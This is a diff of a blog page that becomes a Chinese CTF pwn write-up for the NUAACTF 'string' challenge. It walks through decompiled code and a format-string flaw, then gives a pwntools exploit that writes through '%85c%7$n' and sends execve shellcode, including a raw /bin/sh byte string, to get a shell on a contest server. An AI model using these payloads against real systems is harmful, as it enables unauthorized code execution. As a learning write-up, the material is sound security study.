@@ -6,16 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://thriumph.top">
-  <title>Archives | Thriumph</title>
+  <title>NUAACTF-string | Thriumph</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="keywords" content="pwn,re,渗透测试">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Thriumph">
-<meta property="og:url" content="https://thriumph.top/archives/page/4/index.html">
+  <meta name="description" content="做这个题花了好长时间去分析">
+<meta name="keywords" content="-ctf -pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NUAACTF-string">
+<meta property="og:url" content="https://thriumph.top/NUAACTF-string.html">
 <meta property="og:site_name" content="Thriumph">
+<meta property="og:description" content="做这个题花了好长时间去分析">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://thriumph.top/NUAACTF-string/1.png">
+<meta property="og:image" content="https://thriumph.top/NUAACTF-string/2.png">
+<meta property="og:image" content="https://thriumph.top/NUAACTF-string/3.png">
+<meta property="og:updated_time" content="2019-10-22T08:14:46.252Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Thriumph">
+<meta name="twitter:title" content="NUAACTF-string">
+<meta name="twitter:description" content="做这个题花了好长时间去分析">
+<meta name="twitter:image" content="https://thriumph.top/NUAACTF-string/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Thriumph" type="application/atom+xml">
   
@@ -153,196 +161,256 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-NUAACTF-string" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      NUAACTF-string
+    </h1>
+  
+
+
+        
+        <!--显示阅读次数-->
+        
+          <br/>
+          <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+          <span class="icon-sort"></span>
+          <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+                    阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+          </span>
+          </a>
+        
+        <!--显示阅读次数完毕-->
+
+
+        
+        <a href="/NUAACTF-string.html" class="archive-article-date">
+  	<time datetime="2019-10-21T04:04:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-21</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>做这个题花了好长时间去分析</p>
+<a id="more"></a>
+<h1 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h1><p><img src="/NUAACTF-string/1.png" alt><br>程序是64位的，基于x86构架的，开启了canary保护和堆栈不可执行保护</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><strong>main()函数</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST18_8</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  sub_400996();</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  v4 = (__int64)v3;</span><br><span class="line">  *v3 = <span class="number">68</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">85</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"we are wizard, we will give you hand, you can not defeat dragon by yourself ..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"we will tell you two secret ..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret[0] is %x\n"</span>, v4, a2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret[1] is %x\n"</span>, v4 + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"do not tell anyone "</span>);</span><br><span class="line">  sub_400D72(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"The End.....Really?"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会调用sub_400D72(v4)，其中v4=( _ int64) v3。大致流程就是随机生成一个v3,v3[0]=68,v3[1]=85,v3[0]的地址是a2</p>
+<p><strong>sub_400D72函数</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_400D72</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What should your character's name be:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%s"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) &lt;= <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Creating a new player."</span>);</span><br><span class="line">    sub_400A7D(<span class="string">"Creating a new player."</span>);</span><br><span class="line">    sub_400BB9();</span><br><span class="line">    sub_400CA6(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hei! What's up!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入的长度要小于12。<br>这里面还分别调用了三个函数，sub_400A7D，sub_400BB9和sub_400CA6，分别进去查看</p>
+<p><strong>sub_400A7D函数</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_400A7D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" This is a famous but quite unusual inn. The air is fresh and the"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"marble-tiled ground is clean. Few rowdy guests can be seen, and the"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"furniture looks undamaged by brawls, which are very common in other pubs"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"all around the world. The decoration looks extremely valuable and would fit"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"into a palace, but in this city it's quite ordinary. In the middle of the"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"room are velvet covered chairs and benches, which surround large oaken"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tables. A large sign is fixed to the northern wall behind a wooden bar. In"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"one corner you notice a fireplace."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"There are two obvious exits: east, up."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"But strange thing is ,no one there."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"So, where you will go?east or up?:"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">"%s"</span>, &amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"east"</span>) || !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"east"</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hei! I'm secious!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"So, where you will go?:"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, <span class="string">"east"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"up"</span>) )</span><br><span class="line">      sub_4009DD(&amp;s1, <span class="string">"up"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"YOU KNOW WHAT YOU DO?"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入east或up，输入up会进入sub_4009DD，输出puts(“YOU ARE DEAD”)。所以输入要和east相等</p>
+<p><strong>sub_400BB9()函数</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_400BB9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You travel a short distance east.That's odd, anyone disappear suddenly"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">", what happend?! You just travel , and find another hole"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You recall, a big black hole will suckk you into it! Know what should you do?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"go into there(1), or leave(0)?:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"A voice heard in your mind"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"'Give me an address'"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%ld"</span>, &amp;v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And, you wish is:"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%s"</span>, &amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your wish is"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format, &amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I hear it, I hear it...."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到了<code>printf(&amp;format, &amp;format);</code>这是一个格式化字符串的漏洞</p>
+<p><strong>sub_400CA6函数</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_400CA6</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Dragon say: HaHa! you were supposed to have a normal"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"RPG game, but I have changed it! you have no weapon and "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"skill! you could not defeat me !"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"That's sound terrible! you meet final boss!but you level is ONE!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 == a1[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wizard: I will help you! USE YOU SPELL"</span>);</span><br><span class="line">    v1 = mmap(<span class="number">0L</span>L, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">    read(<span class="number">0</span>, v1, <span class="number">0x100</span>uLL);</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(_QWORD, <span class="keyword">void</span> *))v1)(<span class="number">0L</span>L, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code>a1[0]=a1[1]，把v1强制转化成一个函数指针并调用这个函数。</p>
+<p><img src="/NUAACTF-string/2.png" alt><br>之后可以看到调用了read函数</p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>通过printf任意地址写入使 * a1 == a1[1]，也就是使v3[0]=v3[1]=85。需要知道v3[0]的地址，在main函数发现其实secret[0]即v3[0]的地址，所以就可以利用printf任意地址写修改v3[0]处的值了。在64位程序下，前6个参数从左到右依次放到RDI、RSI、RDX、RCX、R8、R9中，所以从第七个开始，我们就可以修改栈中的数据为85</p>
+<p>也可以通过%x查看偏移，偏移为7<br><img src="/NUAACTF-string/3.png" alt></p>
+<p>所以构造payload为<code>&quot;%85d%7$n&quot;</code></p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'44407'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">addr = int(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">payload = asm(shellcraft.amd64.linux.sh(), arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#payload2 = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">p.recvuntil(<span class="string">'What should your character\'s name be:'</span>)</span><br><span class="line">p.sendline(<span class="string">'AAAA'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'So, where you will go?east or up?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'east'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'go into there(1), or leave(0)?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\'Give me an address\''</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">'And, you wish is:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%85c%7$n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Wizard: I will help you! USE YOU SPELL'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(payload2)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/网络层数据平面.html" class="archive-article-date">
-  	<time datetime="2019-06-06T15:44:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/网络层数据平面.html">网络层数据平面</a>
-    </h1>
-  
+      <!- 百度自动推送方式提交 -->
+      
+        <script>
+        (function(){
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') {
+                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            }
+            else {
+                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+            }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+        </script>
+      
+      <!- 百度自动推送方式提交结束 -->
 
-        <div class="article-info info-on-right">
+
+
+
+      
+      
+        <div class="declare">
+          <strong>本文作者：</strong>
           
+            Thriumph
+          
+          <br>
+          <strong>本文链接：</strong>
+          https://thriumph.top/NUAACTF-string.html
+          <br>
+          <strong>版权声明：</strong>
+          本作品采用
+          <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>
+          进行许可。转载请注明出处！
+          
+            <br>
+            <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"/></a>
+          
+        </div>
+      
+
+
+
+      
+    </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">读书笔记</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">-ctf -pwn</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+    
 
+    
+
+    
+      
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
   </div>
-</article>
-  
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://thriumph.top//NUAACTF-string.html" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/运输层.html" class="archive-article-date">
-  	<time datetime="2019-06-06T15:17:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/运输层.html">运输层</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">读书笔记</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+    <div class="clearfix"></div>
   </div>
+</div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/应用层.html" class="archive-article-date">
-  	<time datetime="2019-06-06T15:03:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-06</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/XMAN-level2.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">XMAN-level2</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/应用层.html">应用层</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">读书笔记</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#查看保护"><span class="toc-number">1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#思路"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/计算机网络和因特网.html" class="archive-article-date">
-  	<time datetime="2019-06-06T14:59:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-06</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/计算机网络和因特网.html">计算机网络和因特网</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">读书笔记</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/3/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="page-number current">4</span>
-    </nav>
+  
+
   
 
 
+
+
+
+
+  
+  
           </div>
         </div>
       </div>
@@ -382,8 +450,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
